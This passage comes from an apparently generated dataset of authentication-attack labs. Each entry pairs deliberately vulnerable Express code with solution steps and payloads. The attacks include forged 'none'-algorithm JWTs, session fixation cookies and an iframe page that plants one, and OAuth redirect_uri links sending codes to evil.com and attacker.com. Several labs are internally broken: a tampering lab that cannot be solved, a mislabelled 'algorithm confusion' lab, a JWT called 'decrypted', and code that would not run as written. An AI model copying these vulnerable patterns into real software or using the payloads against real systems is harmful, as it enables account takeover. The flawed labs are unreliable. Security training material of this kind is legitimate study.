    "Modify the 'X-Forwarded-Host' header to point to your exploit server.",
    "Send the modified request to trigger the sending of a poisoned reset link.",
    "Monitor your exploit server to capture the reset token when Carlos accesses the link.",
    "Use the captured token to reset Carlos's password and log in to his account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').urlencoded({ extended: true })); app.post('/forgot-password', (req, res) => { const host = req.headers['x-forwarded-host'] || req.headers.host; const resetLink = `http://${host}/reset?token=abc123`; // send resetLink via email }); app.listen(3000);",
  "payloads": [
    "X-Forwarded-Host: attacker.com",
    "X-Forwarded-Host: exploit-server.net"
  ]
},
{
  "Lab scenario": "Broken Brute-Force Protection via Multiple Credentials per Request in Login Endpoint",
  "Lab Description": "The application's login endpoint accepts JSON input but fails to handle arrays properly. By sending multiple passwords in an array, attackers can bypass brute-force protection mechanisms. The application processes each password in the array without rate limiting. To solve: Submit a login request with an array of passwords to discover Carlos's password.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept the login request using Burp Suite.",
    "Modify the 'password' field to be an array of common passwords.",
    "Send the modified request and observe the response.",
    "Identify the correct password from the response.",
    "Log in as Carlos using the discovered password."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').json()); const users = { 'carlos': 'monkey' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (Array.isArray(password)) { for (let pass of password) { if (users[username] === pass) return res.send('Login successful'); } } else if (users[username] === password) { return res.send('Login successful'); } res.status(401).send('Invalid credentials'); }); app.listen(3000);",
  "payloads": [
    "{ \"username\": \"carlos\", \"password\": [\"123456\", \"monkey\", \"password\"] }"
  ]
},
{
  "Lab scenario": "JWT none algorithm attack in REST API authentication",
  "Lab Description": "The application uses JWT-based authentication to protect a RESTful API. However, the backend JWT implementation fails to properly enforce algorithm restrictions. When verifying tokens, it blindly accepts tokens with 'alg':'none' without validating signatures. To solve: forge a JWT for the 'admin' user using 'none' algorithm and access the /admin dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept a valid login and capture the Authorization: Bearer <JWT> header.",
    "Decode the JWT using jwt.io or Burp Decoder and note the algorithm and payload structure.",
    "Replace the 'alg' value with 'none' and modify the payload to {\"user\":\"admin\"}. Leave the signature section blank.",
    "Send a modified Authorization header: Bearer <unsigned token> using Postman to GET /admin.",
    "Verify access to /admin with the forged JWT and confirm admin privileges were granted."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const jwt = require('jsonwebtoken');\nconst express = require('express');\nconst app = express();\nconst SECRET = 'supersecretkey';\n\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, SECRET, { algorithms: ['HS256', 'none'] });\n    if (decoded.user === 'admin') {\n      return res.send('Welcome admin!');\n    }\n    return res.status(403).send('Access denied');\n  } catch (err) {\n    console.error('JWT error:', err);\n    return res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(4000, () => console.log('JWT Lab listening on port 4000'));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
    "{\"alg\":\"none\"}.{\"user\":\"admin\"}.",
    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
  ]
},
{
  "Lab scenario": "Session fixation via vulnerable Set-Cookie path handling in REST login endpoint",
  "Lab Description": "The application authenticates users via a REST API and sets a session ID in a cookie. However, it does not regenerate the session ID after login. It accepts attacker-supplied session IDs and binds them to authenticated users, leading to session fixation. To solve: Fix a session for 'carlos', log in with it, and access /profile as Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept a GET /login request and note the Set-Cookie: session=... header format.",
    "Craft a malicious session ID and set it using the Set-Cookie header manually via curl or Burp.",
    "Send the session cookie to the victim (simulate click or load via /set-session endpoint).",
    "Have victim log in (simulate via POST /login) using their credentials while session is fixed.",
    "Replay request to /profile using the fixed session ID and verify it returns Carlos's profile."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\nconst sessions = {};\nconst users = { 'carlos': 'hunter2' };\n\napp.post('/login', (req, res) => {\n  const sessId = req.cookies.session || Math.random().toString(36).substring(2);\n  const { username, password } = req.query;\n  if (users[username] === password) {\n    sessions[sessId] = username;\n    res.cookie('session', sessId);\n    return res.send('Logged in');\n  }\n  return res.status(401).send('Auth failed');\n});\n\napp.get('/profile', (req, res) => {\n  const user = sessions[req.cookies.session];\n  if (user) return res.send(`Profile of ${user}`);\n  res.status(403).send('Forbidden');\n});\n\napp.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
  "payloads": [
    "Cookie: session=attackerSession123",
    "GET /set-session Cookie: session=attackerSession123",
    "POST /login?username=carlos&password=hunter2 with Cookie: session=attackerSession123"
  ]
},
{
  "Lab scenario": "OAuth code injection in redirect_uri during OAuth2.0 authorization flow",
  "Lab Description": "The application uses OAuth 2.0 for third-party login. The authorization server is misconfigured and accepts wildcards in redirect_uri. This allows attackers to intercept authorization codes via open redirect-style endpoints. To solve: steal Carlos's OAuth code using a manipulated redirect_uri, then redeem it to access their account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Start OWASP ZAP and crawl the OAuth login flow to identify the /authorize?redirect_uri parameter.",
    "Modify the redirect_uri to point to your controlled endpoint (e.g., /auth/log?next=evil.com).",
    "Send the authorization URL to Carlos (simulate victim click or login trigger).",
    "Log the intercepted code from the malicious redirect_uri callback.",
    "Exchange the stolen code via POST /oauth/token and get the access_token, then access Carlos’s data via /api/me."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst app = express();\nconst tokens = {};\n\napp.get('/authorize', (req, res) => {\n  const { redirect_uri, state } = req.query;\n  const code = 'code1234';\n  tokens[code] = 'carlos';\n  res.redirect(`${redirect_uri}?code=${code}&state=${state}`);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { code } = req.query;\n  if (tokens[code]) {\n    return res.json({ access_token: 'token-for-' + tokens[code] });\n  }\n  res.status(400).json({ error: 'Invalid code' });\n});\n\napp.get('/api/me', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (token === 'token-for-carlos') {\n    return res.send('Welcome Carlos!');\n  }\n  res.status(403).send('Invalid token');\n});\n\napp.listen(4000, () => console.log('OAuth2 Intercept Lab running on port 4000'));",
  "payloads": [
    "https://vulnapp.com/authorize?redirect_uri=https://evil.com/capture",
    "POST /oauth/token?code=code1234",
    "Authorization: Bearer token-for-carlos"
  ]
},
{
  "Lab scenario": "Session fixation via predictable token reuse",
  "Lab Description": "This REST-based web application uses cookie-based session tokens for authentication. The application generates a session ID during login but fails to regenerate or invalidate the session ID upon successful authentication. The session remains fixed even if the login state changes. To solve: hijack Carlos's session by planting a valid session ID before login, then access his My account page after he logs in.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Using Burp Suite, visit the login page and capture the Set-Cookie header from an unauthenticated session.",
    "2.Use OWASP ZAP or Burp Repeater to modify the session cookie manually and send repeated unauthenticated requests to ensure session reuse behavior.",
    "3.Share the fixed session ID with Carlos (simulated by planting it via a crafted phishing link).",
    "4.Assume Carlos logs in using the fixed session. Use the same session cookie to access /my-account endpoint.",
    "5.If the session was not regenerated upon login, the attacker is now authenticated as Carlos. Validate by accessing /my-account and confirming Carlos's info is displayed."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(session({ secret: 'insecure', resave: false, saveUninitialized: true }));\napp.use(bodyParser.urlencoded({ extended: true }));\nconst users = [{ username: 'carlos', password: 'supersecure' }];\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (!user) return res.status(401).send('Invalid login');\n  req.session.user = username;\n  console.log('[DEBUG] Session ID remains: ' + req.sessionID);\n  res.send(`Welcome ${username}`);\n});\napp.get('/my-account', (req, res) => {\n  if (req.session.user === 'carlos') {\n    res.send('Account details for Carlos');\n  } else {\n    res.status(403).send('Unauthorized');\n  }\n});\napp.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
  "payloads": [
    "GET /login HTTP/1.1\\nSet-Cookie: sessionid=attackerSession123",
    "Phishing link: http://target-app/login?sessionid=attackerSession123",
    "Use sessionid=attackerSession123 after Carlos logs in"
  ]
},
{
  "Lab scenario": "JWT tampering via algorithm confusion",
  "Lab Description": "The application uses JWT for session management and validates tokens using the 'alg' field. It accepts tokens signed with both HMAC and RSA but uses the same verification method. This results in an algorithm confusion vulnerability. To solve: forge a JWT using HMAC with a known public key and gain access to Carlos's account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Intercept a valid JWT after logging in and decode it using jwt.io or Burp Decoder.",
    "2.Observe that alg is set to RS256 and the token uses a public key signature.",
    "3.Create a forged token where alg is set to HS256 and sign it using the same public key (as secret).",
    "4.Replace the token in your request headers with the forged one. Set payload to { \"username\": \"carlos\" }.",
    "5.Send a request to /my-account with the forged JWT. If successful, Carlos’s account page is displayed."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\nconst pubKey = fs.readFileSync('public.pem');\napp.use((req, res, next) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (token) {\n    try {\n      const decoded = jwt.verify(token, pubKey, { algorithms: ['RS256', 'HS256'] });\n      req.user = decoded.username;\n    } catch (e) {\n      return res.status(403).send('Invalid token');\n    }\n  }\n  next();\n});\napp.get('/my-account', (req, res) => {\n  if (req.user === 'carlos') {\n    res.send('Account details for Carlos');\n  } else {\n    res.status(403).send('Unauthorized');\n  }\n});\napp.listen(4001, () => console.log('JWT Algorithm Confusion Lab running on http://localhost:4001'));",
  "payloads": [
    "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }",
    "{ \"username\": \"carlos\" }",
    "Sign using HMAC with public.pem content as secret"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration via open redirect",
  "Lab Description": "The application integrates OAuth2 login via a third-party provider. However, the redirect_uri parameter is improperly validated, enabling attackers to manipulate the OAuth flow. To solve: exploit the open redirect to steal an access token and access the protected account page as Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Use Burp Suite to observe the OAuth login flow. Identify the redirect_uri parameter passed to the provider.",
    "2.Modify redirect_uri to point to your controlled domain and initiate login to intercept the token.",
    "3.Use the stolen token in an Authorization: Bearer header and access the /my-account endpoint.",
    "4.Use Postman or Burp Repeater to pass the hijacked token and verify access to Carlos's account.",
    "5.Confirm the lab is solved when the response reveals Carlos’s private information."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\napp.get('/oauth/callback', async (req, res) => {\n  const { code, redirect_uri } = req.query;\n  try {\n    const tokenRes = await axios.post('https://oauth-provider/token', {\n      code,\n      redirect_uri\n    });\n    const accessToken = tokenRes.data.access_token;\n    const userInfo = await axios.get('https://oauth-provider/userinfo', {\n      headers: { Authorization: `Bearer ${accessToken}` }\n    });\n    if (userInfo.data.username === 'carlos') {\n      return res.send('Welcome back Carlos');\n    } else {\n      return res.status(403).send('Not Carlos');\n    }\n  } catch (e) {\n    res.status(500).send('OAuth flow error');\n  }\n});\napp.listen(4002, () => console.log('OAuth Open Redirect Lab running on http://localhost:4002'));",
  "payloads": [
    "https://oauth-provider/auth?client_id=lab-client&redirect_uri=https://evil.com/callback",
    "Authorization: Bearer <stolen_token>",
    "Use Repeater to GET /my-account with forged Authorization header"
  ]
},
{
  "Lab scenario": "SOAP-based SSO Session Fixation in Login Workflow",
  "Lab Description": "The application uses a SOAP-based Single Sign-On (SSO) authentication mechanism that fails to regenerate the session identifier after login. The application accepts a session cookie before authentication and keeps it post-login. To solve: Hijack an admin user's session by fixing their session ID via a crafted SOAP request and accessing the /admin/dashboard page.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP's Intercepting Proxy to capture the initial unauthenticated session identifier by visiting the homepage.",
    "2. Send a crafted SOAP login request using Postman with a manually inserted JSESSIONID from your session in the Cookie header.",
    "3. Wait for the admin to authenticate with the same fixed JSESSIONID, which is reused post-authentication.",
    "4. Reuse the fixed session ID in your own browser's cookie to take over the authenticated admin session.",
    "5. Navigate to /admin/dashboard to verify the hijack and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const soap = require('soap'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.use(bodyParser.text({ type: 'text/xml' })); let users = { 'admin': { password: 'supersecret' } }; app.post('/soap-login', (req, res) => { const match = req.body.match(/<username>(.*?)<\\/username>.*<password>(.*?)<\\/password>/); if (!match) return res.status(400).send('Invalid SOAP'); const [_, username, password] = match; if (users[username] && users[username].password === password) { req.session.user = username; console.log('[DEBUG] Session fixed for:', req.sessionID); res.send('<soap:Envelope><soap:Body>Login Success</soap:Body></soap:Envelope>'); } else { res.status(403).send('<soap:Envelope><soap:Body>Login Failed</soap:Body></soap:Envelope>'); } }); app.get('/admin/dashboard', (req, res) => { if (req.session.user === 'admin') res.send('Welcome Admin Dashboard'); else res.status(403).send('Access denied'); }); app.listen(3000, () => console.log('[SOAP SSO Lab] Running on port 3000'));",
  "payloads": [
    "POST /soap-login HTTP/1.1\\nCookie: JSESSIONID=fixed-session-id\\n<username>admin</username><password>supersecret</password>",
    "GET /admin/dashboard with Cookie: JSESSIONID=fixed-session-id"
  ]
},
{
  "Lab scenario": "JWT Tampering via Algorithm Confusion in REST API",
  "Lab Description": "The application uses JWTs to authorize users after login, but improperly validates the algorithm field. An attacker can change the algorithm from 'RS256' to 'none' and supply an unsigned token to bypass authentication. To solve: Forge a valid JWT that grants 'admin' privileges and access /admin/flags endpoint.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Intercept the JWT issued after login with Burp Suite and note the 'alg' is RS256 and 'kid' is present.",
    "2. Modify the JWT header to change the 'alg' value from RS256 to none and remove the signature.",
    "3. Change the payload 'role':'user' to 'role':'admin' and base64-encode both parts.",
    "4. Resend the tampered JWT using Postman with Authorization: Bearer <your-token> header.",
    "5. Access the /admin/flags endpoint to verify the privilege escalation and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const pubKey = 'fake-public-key'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username, role: 'user' }, pubKey, { algorithm: 'RS256', header: { kid: '1' } }); console.log('[DEBUG] Token issued:', token); res.json({ token }); }); app.get('/admin/flags', (req, res) => { try { const token = req.headers.authorization.split(' ')[1]; const payload = jwt.verify(token, pubKey); if (payload.role === 'admin') return res.send('CTF_FLAG{jwt_admin_bypass}'); else return res.status(403).send('Insufficient role'); } catch (e) { return res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('[JWT Tamper Lab] Listening on port 4000'));",
  "payloads": [
    "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
    "Payload: {\"user\":\"admin\",\"role\":\"admin\"}",
    "Unsigned JWT: base64url(header).base64url(payload)."
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration with Authorization Code Leak via Open Redirect",
  "Lab Description": "The OAuth login flow has a misconfigured redirect_uri that allows open redirection to untrusted domains. An attacker can intercept the authorization code and exchange it for a valid access token. To solve: Steal a victim’s OAuth code and use it to access the /profile endpoint as the victim.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Start OAuth login flow and observe the 'redirect_uri' includes a return parameter vulnerable to open redirection.",
    "2. Craft a malicious redirect_uri that includes your attacker site (e.g., https://attacker.com/steal?code=).",
    "3. Send a phishing link to the victim that starts the OAuth login with your redirect_uri.",
    "4. Capture the stolen authorization code from the redirect to your attacker site.",
    "5. Exchange the code manually using Postman with the /oauth/token endpoint and use the access token to call /profile."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const users = { carlos: { token: 'user123', profile: 'Carlos Profile Details' } }; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, state } = req.query; const code = 'user123'; console.log('[DEBUG] OAuth issued code:', code); return res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'user123') return res.json({ access_token: 'access-token-carlos' }); res.status(400).send('Invalid code'); }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'access-token-carlos') res.send('Carlos Profile Details'); else res.status(401).send('Unauthorized'); }); app.listen(5000, () => console.log('[OAuth Redirect Lab] Running on port 5000'));",
  "payloads": [
    "https://vulnerable-app.com/oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/steal&response_type=code&state=xyz",
    "POST /oauth/token with {\"code\":\"user123\"}",
    "GET /profile with Authorization: Bearer access-token-carlos"
  ]
},
{
  "Lab scenario": "Session Fixation via SOAP API Login Handler",
  "Lab Description": "The SOAP-based authentication flow mishandles session state. The application accepts session IDs from unauthenticated users and preserves them post-login. To solve: hijack a victim's session by pre-setting a session ID and tricking them into using it, then log in yourself using that session.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to intercept a login request and observe the Set-Cookie header for session ID creation.",
    "2. Send a SOAP request manually to the login handler while injecting a custom PHPSESSID using Burp Repeater.",
    "3. Craft an HTML page that loads the vulnerable endpoint in an invisible iframe while setting the PHPSESSID via document.cookie.",
    "4. Send the link to the victim or simulate a visit by the victim's browser to bind their login to your session.",
    "5. Reuse the same session ID to access the authenticated dashboard and verify the hijacked account access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst cookieParser = require('cookie-parser');\nconst soap = require('soap');\nconst app = express();\napp.use(bodyParser.text());\napp.use(cookieParser());\nconst sessions = {};\nconst users = { carlos: 'hunter2' };\napp.post('/soap-auth', (req, res) => {\n  const parsed = req.body.match(/<username>(.*?)<\\/username>.*<password>(.*?)<\\/password>/);\n  const username = parsed[1];\n  const password = parsed[2];\n  if (users[username] === password) {\n    const sessId = req.cookies.PHPSESSID || `sess_${Math.random()}`;\n    sessions[sessId] = username;\n    res.cookie('PHPSESSID', sessId);\n    res.send(`<loginResponse><message>Welcome ${username}</message></loginResponse>`);\n  } else {\n    res.send('<loginResponse><message>Invalid</message></loginResponse>');\n  }\n});\napp.get('/dashboard', (req, res) => {\n  const user = sessions[req.cookies.PHPSESSID];\n  if (user) {\n    res.send(`Logged in as ${user}`);\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\napp.listen(4000, () => console.log('Session Fixation SOAP Lab running on port 4000'));",
  "payloads": [
    "<html><script>document.cookie='PHPSESSID=fixed-session';</script><iframe src='http://victim.site/soap-auth'></iframe></html>",
    "<Envelope><Body><username>carlos</username><password>hunter2</password></Body></Envelope>",
    "Cookie: PHPSESSID=fixed-session"
  ]
},
{
  "Lab scenario": "JWT Algorithm Confusion in GraphQL Login",
  "Lab Description": "The GraphQL authentication service allows JWTs signed with 'none' algorithm. An attacker can forge tokens to impersonate other users. To solve: craft a JWT impersonating 'admin' and access the admin dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Postman to send a GraphQL mutation to log in as a user and capture the returned JWT.",
    "2. Decode the JWT and observe the use of the 'alg' header (e.g., HS256).",
    "3. Modify the token header to use 'alg':'none' and set the payload to { \"username\": \"admin\" }.",
    "4. Remove the signature and reassemble the JWT.",
    "5. Use Burp Suite or Postman to send a GraphQL query using the forged JWT in the Authorization header and access the admin data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(bodyParser.json());\nconst secret = 'hardcoded-secret';\napp.post('/graphql', (req, res) => {\n  if (req.body.query.includes('login')) {\n    const token = jwt.sign({ username: req.body.variables.username }, secret, { algorithm: 'HS256' });\n    return res.json({ data: { token } });\n  }\n  const auth = req.headers.authorization?.split(' ')[1];\n  let payload;\n  try {\n    payload = jwt.verify(auth, secret, { algorithms: ['HS256', 'none'] });\n  } catch (e) {\n    return res.status(401).json({ error: 'Invalid token' });\n  }\n  if (payload.username === 'admin') {\n    return res.json({ data: { flag: 'admin_dashboard_access_granted' } });\n  }\n  res.json({ data: { user: payload.username } });\n});\napp.listen(4001, () => console.log('JWT Confusion GraphQL Lab running on port 4001'));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
    "{ query: '{adminDashboard}' }"
  ]
},
{
  "Lab scenario": "OAuth Open Redirect Exploit in REST API",
  "Lab Description": "The OAuth login endpoint lacks strict validation on the `redirect_uri` parameter. An attacker can exploit this to steal tokens via open redirect. To solve: craft an OAuth URL that steals an access token from a victim and access protected resources as the victim.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to capture the OAuth flow and inspect the authorization URL issued.",
    "2. Observe the redirect_uri parameter and test open redirection by modifying it to point to attacker.com.",
    "3. Host a malicious site that logs the access_token from the fragment of the redirected URI.",
    "4. Trick the victim into clicking the modified OAuth link.",
    "5. Once the access_token is stolen, use Postman to call the protected resource API with the token."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst app = express();\nconst tokens = { 'victim': 'abc123token' };\napp.get('/auth', (req, res) => {\n  const { client_id, redirect_uri, response_type } = req.query;\n  if (response_type === 'token') {\n    const token = tokens['victim'];\n    return res.redirect(`${redirect_uri}#access_token=${token}`);\n  }\n  res.status(400).send('Invalid flow');\n});\napp.get('/resource', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  if (token === 'abc123token') {\n    return res.send('Welcome to victim\'s data.');\n  }\n  res.status(403).send('Unauthorized');\n});\napp.listen(4002, () => console.log('OAuth Open Redirect Lab running on port 4002'));",
  "payloads": [
    "http://localhost:4002/auth?client_id=123&redirect_uri=http://attacker.com&response_type=token",
    "GET /resource HTTP/1.1\\nAuthorization: Bearer abc123token",
    "<script>location.href='http://localhost:4002/auth?client_id=123&redirect_uri=http://attacker.com&response_type=token';</script>"
  ]
},
{
  "Lab scenario": "Session fixation vulnerability via insecure cookie handling in login flow",
  "Lab Description": "The application mishandles session cookies by issuing them before authentication, then reusing them post-login. The vulnerable behavior allows an attacker to fix the session ID for a victim prior to login. To solve: Hijack Carlos's session by forcing him to use a known session ID, then log in and access his account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Using Burp Suite, visit the login page and capture the Set-Cookie header to observe the issued session ID before login.",
    "2.Use Postman or Burp Repeater to log in to your own account and verify the session ID does not change after login.",
    "3.Generate a session ID and craft a malicious link to send to Carlos with the session ID embedded in a cookie.",
    "4.Trick Carlos into visiting the crafted link to fix the session.",
    "5.Log in as Carlos using known credentials and reuse the fixed session ID to hijack the authenticated session.",
    "6.Access /my-account endpoint using the hijacked session to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); let sessions = {}; let users = [{ username: 'carlos', password: 'carlospass' }]; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(2); res.setHeader('Set-Cookie', `session=${sid}; Path=/; HttpOnly`); sessions[sid] = { loggedIn: false }; res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user && sessions[sid]) { sessions[sid].loggedIn = true; sessions[sid].user = username; res.redirect('/my-account'); } else { res.status(401).send('Invalid'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid] && sessions[sid].loggedIn) { res.send(`Welcome to Carlos's account`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
  "payloads": [
    "GET /login",
    "GET /login with Set-Cookie: session=attackerKnownID",
    "POST /login with Cookie: session=attackerKnownID and body: username=carlos&password=carlospass"
  ]
},
{
  "Lab scenario": "JWT authentication bypass via algorithm confusion in authorization middleware",
  "Lab Description": "The application uses JWTs to authenticate API requests but improperly trusts the 'alg' header in user-supplied tokens. The vulnerable middleware disables signature verification if the algorithm is 'none'. To solve: Forge a JWT for Carlos and access the protected user profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Intercept a valid JWT from your own session using Burp Suite.",
    "2.Decode the token using jwt.io or Postman to inspect the header and payload fields.",
    "3.Replace the alg field in the JWT header with 'none' and change the sub field to 'carlos'. Remove the signature entirely.",
    "4.Resign the JWT with no signature and use it in the Authorization: Bearer header.",
    "5.Send a GET request to /api/profile with the forged token to access Carlos's data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'carlospass' }]; const secret = 'supersecretkey'; function verifyJWT(req, res, next) { const token = req.headers.authorization?.split(' ')[1]; const decoded = JSON.parse(Buffer.from(token.split('.')[0], 'base64').toString()); if (decoded.alg === 'none') { req.user = { username: JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).sub }; return next(); } jwt.verify(token, secret, (err, user) => { if (err) return res.status(403).send('Invalid token'); req.user = user; next(); }); } app.get('/api/profile', verifyJWT, (req, res) => { if (req.user.username === 'carlos') { res.send('Carlos\'s sensitive profile info'); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('JWT None Alg Lab running'));",
  "payloads": [
    "{ \"alg\": \"none\", \"typ\": \"JWT\" }.{ \"sub\": \"carlos\" }.",
    "Authorization: Bearer <base64(header)>.<base64(payload)>.",
    "GET /api/profile with modified JWT"
  ]
},
{
  "Lab scenario": "OAuth 2.0 misconfiguration allows redirect_uri manipulation and code interception",
  "Lab Description": "The application uses OAuth 2.0 for third-party login, but it accepts arbitrary redirect_uris due to improper validation. An attacker can intercept authorization codes meant for Carlos. To solve: Gain access to Carlos’s OAuth account by hijacking his authorization code.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Start OWASP ZAP and configure it as the browser proxy. Navigate to the OAuth login flow and intercept the authorization request URL.",
    "2.Observe that the redirect_uri is not validated and is included in the authorization request as a query parameter.",
    "3.Craft a malicious OAuth login URL with a redirect_uri pointing to your attacker-controlled server (e.g., https://evil.net/intercept).",
    "4.Trick Carlos into clicking the malicious login link. Capture the intercepted code on your server.",
    "5.Exchange the stolen code at the token endpoint and receive an access token for Carlos.",
    "6.Use the access token to call the /userinfo endpoint and access Carlos's account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, client_id } = req.query; const authCode = 'code-carlos123'; res.redirect(`${redirect_uri}?code=${authCode}`); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'code-carlos123') res.json({ access_token: 'access-token-carlos' }); else res.status(400).send('Invalid code'); }); app.get('/userinfo', (req, res) => { const { authorization } = req.headers; if (authorization === 'Bearer access-token-carlos') res.send('Carlos user profile'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Code Interception Lab running'));",
  "payloads": [
    "https://vulnerable-app.com/auth?client_id=123&redirect_uri=https://evil.net/intercept",
    "Captured code: code-carlos123",
    "POST /token with code=code-carlos123",
    "GET /userinfo with Authorization: Bearer access-token-carlos"
  ]
},
  {
    "Lab scenario": "JWT Token Tampering in API Authentication",
    "Lab Description": "This lab involves a vulnerable JWT-based authentication system where the token can be tampered with to impersonate a different user. To solve the lab, exploit the vulnerability by modifying the JWT token to impersonate Carlos and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept the API request that sends the JWT token using Burp Suite's Proxy.",
      "2. Decrypt the intercepted JWT token using an online JWT decoder.",
      "3. Modify the 'sub' claim in the token to 'carlos' and re-encode the token.",
      "4. Replace the original token in the HTTP Authorization header with the tampered token.",
      "5. Send the request and observe that you gain access to Carlos's account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, sub: user.username }, 'secretkey'); res.json({ token }); }); app.get('/account', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; jwt.verify(token, 'secretkey', (err, decoded) => { if (err) return res.status(401).send('Unauthorized'); if (decoded.sub !== 'carlos') return res.status(403).send('Forbidden'); res.send('Welcome, Carlos'); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:${PORT}'));"
  },
  {
    "Lab scenario": "OAuth Misconfiguration Allowing Unauthorized Access",
    "Lab Description": "This lab demonstrates an OAuth misconfiguration where the application allows access to sensitive resources without proper scope validation. To solve the lab, exploit the OAuth misconfiguration by forging an access token with elevated privileges.",
    "Difficulty Level": "Hard",
